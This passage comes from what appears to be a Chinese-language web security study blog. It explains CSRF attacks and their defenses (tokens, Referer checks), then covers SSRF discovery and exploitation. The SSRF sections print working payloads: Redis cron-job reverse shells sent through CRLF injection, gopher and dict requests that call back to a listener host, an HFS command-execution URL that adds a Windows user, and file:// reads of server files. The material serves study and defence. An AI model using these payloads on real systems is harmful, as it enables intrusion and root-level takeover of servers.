alt="image-20220803094522118"></p><p>那么通过修改get请求中的信息，就可以构造含有自己信息的URL。然后写入自己网站中新建的html。当受害者 <strong>在登录状态下访问</strong> 这个html（外部网站）时就会执行该URL（请求伪造，将个人信息修改为了黑客伪造的内容），达到跨站请求伪造的目的。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202616728.png" alt="image-20220711202616728"></p><p>或者也可以直接使用BP的CSRF功能，自动生成攻击用html。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202945583.png" alt="image-20220711202945583"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203019853.png" alt="image-20220711203019853"></p><p>复制出自动生成的攻击用html代码，修改其中个人信息的参数为自己的信息，然后另存为html</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203224926.png" alt="image-20220711203224926"></p><p>然后若受害者访问该html即可成功执行伪造的请求。</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>网站以post请求提交修改信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142717285.png" alt="image-20220803142717285"></p><p>写攻击页面，其中提交的信息为post请求格式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142920562.png" alt="image-20220803142920562"></p><p>接下来同样诱使用户访问我们自己写的恶意代码的网址即可。当用户再次返回时可以看到值已被修改。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>篡改目标站点上的用户数据</p><p>盗取用户隐私数据</p><p>作为其他攻击的辅助攻击手法</p><p>传播 CSRF 蠕虫</p><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>请求直接是个GET&#x2F;POST请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，<strong>抓包后，如果发现满足上面条件，然后没有referer验证，再去页面测试下</strong>，基本就可以确定存在不存在CSRF漏洞了。</p><h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul><li><p><strong>相同点</strong>：</p><p>XSS、CSRF、SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p></li><li><p><strong>不同点</strong>：</p><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的<strong>脚本语句被执行</strong>。<strong>攻击发生在本站</strong>。</p><p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息<strong>伪造用户请求</strong>发送至服务器。<strong>攻击是跨站的</strong>。 </p><p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板<strong>攻击内网或其他服务器</strong>。</p></li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="强制用户输入密码"><a href="#强制用户输入密码" class="headerlink" title="强制用户输入密码"></a>强制用户输入密码</h3><p>当用户发送重要的请求时需要输入原始密码。</p><h3 id="设置随机Token（最有效）"><a href="#设置随机Token（最有效）" class="headerlink" title="设置随机Token（最有效）"></a>设置随机Token（最有效）</h3><p>服务器每次向客户端返回操作页面时都会给客户端产生一个随机的 Token 值，客户端在页面进行操作时需要携带该 Token，服务器如果检查发现用户携带的 Token 和它产生的不一样，就会判断为攻击行为，拒绝执行。</p><p>使用token比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144026924.png" alt="image-20220803144026924"></p><p>在每次请求中加入了不同的token，等攻击者再利用这个token时，这个token已经过期，无法成功攻击。</p><p><strong>缺点：</strong></p><p><strong>难以给所有的请求都使用token</strong>。在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p><strong>难以保证 token 本身的安全</strong>。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。当用户访问黑客在论坛上发表的这个网站时，系统也会在这个地址后面加上论坛的 token，于是黑客就可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p><p>当然，攻击者可以实现用恶意脚本获取用户的token，然后拦截客户的请求再把 Token 值插入到客户的请求包中。但是这些操作已经超出CSRF攻击的范围。</p><h3 id="检验referer来源"><a href="#检验referer来源" class="headerlink" title="检验referer来源"></a>检验referer来源</h3><p>请求时判断请求链接是否为当前管理员正在使用的页面，要求 Referfer 必须是本服务器自己的主机名（同源检查）。比如：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144318067.png" alt="image-20220803144318067"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP REFERER&#x27;</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER NAME&#x27;</span>]) != <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//Get input</span></span><br><span class="line"><span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如，管理员在编辑文章，黑客发来恶意的修改密码的链接，因为修改密码页面管理员之前并没有在操作，所以攻击者诱骗受害者点击提交的请求中Referer 一定是空值，因此攻击失败。</p><p><strong>局限性：</strong></p><p>首先，<u>referer是可以通过抓包进行修改的</u>。</p><p>再者，<u>检查 Refer 信息并不能防范来自本域的攻击</u>。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。</p><p>同样，某些<u>直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息</u>，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。</p><h3 id="设置验证码"><a href="#设置验证码" class="headerlink" title="设置验证码"></a>设置验证码</h3><h3 id="限制请求只能为post"><a href="#限制请求只能为post" class="headerlink" title="限制请求只能为post"></a>限制请求只能为post</h3><h3 id="在HTTP-头中自定义属性并验证"><a href="#在HTTP-头中自定义属性并验证" class="headerlink" title="在HTTP 头中自定义属性并验证"></a>在HTTP 头中自定义属性并验证</h3><p>不把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p> 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h3 id="安全的会话管理-避免会话被利用"><a href="#安全的会话管理-避免会话被利用" class="headerlink" title="安全的会话管理(避免会话被利用)"></a>安全的会话管理(避免会话被利用)</h3><ol><li>不要在客户端端保存敏感信息(比如身份认证信息) ;</li><li>使页面关闭（退出）时会话过期；</li><li>设置会话过期机制，比如15分钟内无操作，则自动登录超时;</li></ol><h3 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h3><ol><li>敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码;</li><li>敏感信息的修改使用post ,而不是get ;</li><li>通过http头部中的referer来限制原页面</li><li>增加验证码：一般用在登录(防暴力破解)， 也可以用在其他重要信息操作的表单中(需要考虑可用性)。</li></ol><h1 id="x3D-x3D-SSRF-x3D-x3D-（更重要）"><a href="#x3D-x3D-SSRF-x3D-x3D-（更重要）" class="headerlink" title="&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）"></a>&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>SSRF(Server-Side Request Forgery：<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成<u>由服务端发起请求</u>的一个安全漏洞。攻击者向服务器上传恶意地址，服务器未对地址进行检查就直接访问，让目标服务器执行非本意的操作，造成了攻击。</p><p><strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。SSRF常被用于，探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问的主机。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628818773345-5dee00af-4c10-4952-a572-61b413c1b5ac.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>SSRF的形成<strong>大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</strong>。比如没有限制可以构建恶意访问的敏感协议头或内网访问资源权限。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><h2 id="SSRF与CSRF的区别？"><a href="#SSRF与CSRF的区别？" class="headerlink" title="SSRF与CSRF的区别？"></a>SSRF与CSRF的区别？</h2><p>1.SSRF是服务端请求伪造，SSRF是诱导服务器访问，欺骗的是服务端（服务器）</p><p>2.CSRF是跨站请求伪造，CSRF是通过诱导用户点击，欺骗的是客户端（浏览器）</p><h2 id="SSRF的挖掘"><a href="#SSRF的挖掘" class="headerlink" title="SSRF的挖掘"></a>SSRF的挖掘</h2><h3 id="从web功能出发："><a href="#从web功能出发：" class="headerlink" title="从web功能出发："></a>从web功能出发：</h3><ul><li><p>URL分享：通过URL地址分享网页内容</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译（有道翻译ssrf漏洞）：通过URL地址翻译对应文本的内容</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803192304757.png" alt="image-20220803192304757"></p><ul><li><p>图片加载与下载（通过URL地址加载或下载图片）：通过URL地址加载或下载图片，比如上传头像</p></li><li><p>图片、文章收藏功能</p></li><li><p>网站采集、网页抓取的地方</p></li><li><p>一切要你输入网址的地方和可以输入ip的地方。</p></li></ul><h3 id="从URL关键字中寻找："><a href="#从URL关键字中寻找：" class="headerlink" title="从URL关键字中寻找："></a>从URL关键字中寻找：</h3><p>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><h2 id="SSRF的验证"><a href="#SSRF的验证" class="headerlink" title="SSRF的验证"></a>SSRF的验证</h2><p>SSRF漏洞特点：一般通过构造URL来判断该网站是否存在SSRF</p><ol><li><p><strong>白盒测试</strong></p><p>寻找可能构成SSRF漏洞的危险函数：file_get_contents()、fsockopen()、curl_exec()。</p></li><li><p><strong>黑盒测试</strong></p><p>（1）右键图片，看图片（或者其他资源）的URL是否为该网站的路径。如果该图片是其他服务器的地址，则可能存在SSRF漏洞。</p><p>（2）burpsuite抓包，查看网站请求消息报文中是否存在URL，URL请求的是否为内网IP。然后也可以尝试将URL更换为可能的内网地址（通过历史漏洞判断该web应用可能的内网地址），或者暴力拆解内网地址。</p><p>（3）DNS外带（<strong>常用于测试没有回显的网站</strong>）DNSlog平台测试（查询DNS解析过程）</p></li></ol><ul><li><p>排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p></li><li><p>dnslog等工具进行测试，看是否被访问</p><p>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p></li><li><p>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p></li><li><p>直接返回的Banner、title、content等信息</p></li><li><p>留意bool型SSRF</p></li></ul><h2 id="漏洞利用（危害可大可小）"><a href="#漏洞利用（危害可大可小）" class="headerlink" title="漏洞利用（危害可大可小）"></a>漏洞利用（危害可大可小）</h2><ul><li><p><strong>内网探测</strong>：可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>比如输入<code>http://192.168.64.144:3306</code>进行探测。</p></li><li><p><strong>攻击运行在内网或外网的有漏洞程序</strong>（比如溢出）；</p><p>向内部任意主机的任意端口发送精心构造的payload，主要是使用 GET 参数就可以实现的攻击（如Struts2漏洞，SQL注入）；</p></li><li><p>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹（如readme文件）；</p></li><li><p><strong>窃取本地和内网敏感数据</strong>：使用<code>file://</code>协议读取本地文件(或其他协议）</p><p><strong>各个协议调用探针: http, file, dict, ftp, gopher等</strong></p><p><strong>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</strong></p><p>探测内网主机：<code>http://192.168.64.144/phpmyadmin/</code></p><p>**探测服务器文件<code>file:///</code>**：<code>file:///c:/windows/win.ini</code>，在有回显的情况下，利用 file 协议可以读取任意内容</p><p><strong>探测内网服务（dict伪协议）web服务</strong>：<code>dict://192.168.64.144:3306/info</code>，会泄露安装软件版本信息，查看端口，操作内网<strong>redis</strong>服务等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:3360（探测 MySQL 服务）</span><br><span class="line">如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:22（探测 SSH 服务）</span><br><span class="line">dict://127.0.0.1:6379（探测 redis 服务）</span><br><span class="line">dict://127.0.0.1:1433（探测 SQL server 服务）</span><br></pre></td></tr></table></figure><p>探测内网主机的ftp是否开启：<code>ftp://192.168.64.144:21</code></p><p><strong>gopher伪协议</strong> 支持发出GET、POST请求，发送TCP数据，默认端口70</p><p>可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell。所有的WEB服务中间件都支持gopher协议，gopher可以发送任何的TCP数据包，常用于攻击redis服务（内存数据库——拿到该服务即是最高权限）。</p><p><strong>gopher</strong> 的利用可以参考：<a href="http://t.zoukankan.com/beidaxmf-p-13935298.html%E3%80%81https://blog.csdn.net/qq_60115503/article/details/124407499%E3%80%82">http://t.zoukankan.com/beidaxmf-p-13935298.html、https://blog.csdn.net/qq_60115503/article/details/124407499。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发起请求的一般步骤：</span><br><span class="line">1.构造HTTP的请求消息</span><br><span class="line">2.对请求消息进行URL编码</span><br><span class="line">3.对编码后的%0a替换成%0D%0a</span><br><span class="line">4.将替换后的数据再进行一次URL编码（双重URL编码）</span><br><span class="line">5.拼接协议头</span><br></pre></td></tr></table></figure><p><strong>各个脚本语言所支持的协议：</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803190312037.png" alt="image-20220803190312037"></p></li><li><p><strong>作为下一步攻击的跳板</strong></p><p>比如使用ssrf探测内网主机，探查到有一台主机开放了8080端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191051676.png" alt="image-20220803191051676"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191132436.png" alt="image-20220803191132436"></p><p>发现该主机搭载了HFS。搜索HFS相关漏洞，发现<a href="https://blog.csdn.net/qq_45884775/article/details/124065484%EF%BC%8C%E5%AD%98%E5%9C%A8RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E3%80%82payload%E4%B8%BA%60http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">https://blog.csdn.net/qq_45884775/article/details/124065484，存在RCE命令执行漏洞。payload为`http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}&#96;。</p><p>所以可以实施攻击，比如<code>http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe /c net user test1234 1234 /add.&#125;</code>添加用户。或者下载远程文件（下载木马），实施远控。</p></li><li><p><strong>绕过安全防御</strong>：比如防火墙、CDN</p></li></ul><h2 id="SSRF-getshell"><a href="#SSRF-getshell" class="headerlink" title="SSRF getshell"></a>SSRF getshell</h2><h3 id="利用Redis未授权访问getshell"><a href="#利用Redis未授权访问getshell" class="headerlink" title="利用Redis未授权访问getshell"></a>利用Redis未授权访问getshell</h3><p><a href="https://blog.csdn.net/weixin_39194641/article/details/102605354">https://blog.csdn.net/weixin_39194641/article/details/102605354</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p>利用redis写入定时反弹shell任务，用到了CRLF漏洞，url如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">编码前：</span><br><span class="line">http://192.168.31.78:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/</span><br><span class="line"></span><br><span class="line">set x &quot;\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.221.129/55555 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">编码后：</span><br><span class="line">http://192.168.221.134:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/%0D%0A%0D%0Aset%20x%20%22%5cn*%2f1+*+*+*+*+bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.221.129%2f55555+0%3e%261%5cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>本机监听并发送payload如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164339964.png" alt="image-20220926164339964"></p><p>netcat监听，得到了root权限的shell：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164442899.png" alt="image-20220926164442899"></p><h3 id="通过curl命令和gopher协议远程攻击内网redis"><a href="#通过curl命令和gopher协议远程攻击内网redis" class="headerlink" title="通过curl命令和gopher协议远程攻击内网redis"></a>通过curl命令和gopher协议远程攻击内网redis</h3><p>使用gopher协议可以用来发送各种格式的请求包。</p><p>gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。</p><p>此种方法能攻击成功的前提条件是：redis是以root权限运行的。</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=</span><br><span class="line">gopher://172.21.0.2:6379/</span><br><span class="line">_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;</span><br></pre></td></tr></table></figure><p>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；</p><p>payload采用的是bash反弹，定时程序路径是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>发送请求之前在公网机192.168.220.140开启nc监听端口2333</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333 （或nc -l 2333）</span><br></pre></td></tr></table></figure><h3 id="使用dict协议向Redis数据库写shell"><a href="#使用dict协议向Redis数据库写shell" class="headerlink" title="使用dict协议向Redis数据库写shell"></a>使用dict协议向Redis数据库写shell</h3><p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。</p><p>可通过以下三条命令看是否能利用dict：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/xx.php?url=dict://172.21.0.2:6379/info</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/get:user</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/flushall</span><br></pre></td></tr></table></figure><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 清除数据</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/flushall</span><br><span class="line">// 利用302跳转写入反弹命令</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/bhost=*.*.*.*%26bport=1234</span><br><span class="line">// 设置导出路径</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/</span><br><span class="line">// 设置导出名字</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root</span><br><span class="line">// 导出</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/save</span><br></pre></td></tr></table></figure><p>在公网机上使用nc持续监听1234端口，等一会儿把包发完就会反弹shell。</p><h2 id="SSRF漏洞相关函数和协议"><a href="#SSRF漏洞相关函数和协议" class="headerlink" title="SSRF漏洞相关函数和协议"></a>SSRF漏洞相关函数和协议</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p><code>file_get_content</code>函数<strong>从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户</strong>。file_put_content函数把一个字符串写入文件中。支持<code>php://input</code>协议。<code>file_get_contents</code>的gopher协议不能URL编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如，如下页面是通过file参数获得的URL链接请求得到的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171228324.png" alt="image-20220803171228324"></p><p>那么此处可以尝试将URL更换为恶意构造的URL，来达到SSRF攻击的目的。</p><p>比如访问服务器本地的readme文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171413493.png" alt="image-20220803171413493"></p><p>甚至是通过本地文件传输协议<code>file://</code>来访问服务器的指定文件：</p><p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220803171507586.png" alt="image-20220803171507586"></p><p>利用ssrf测试3306端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172447298.png" alt="image-20220803172447298"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172514434.png" alt="image-20220803172514434"></p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen</code>函数实现<strong>对用户指定url数据的获取</strong>，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);    <span class="comment">// 打开socket连接</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;   <span class="comment">// 以get请求获取目标数据</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">  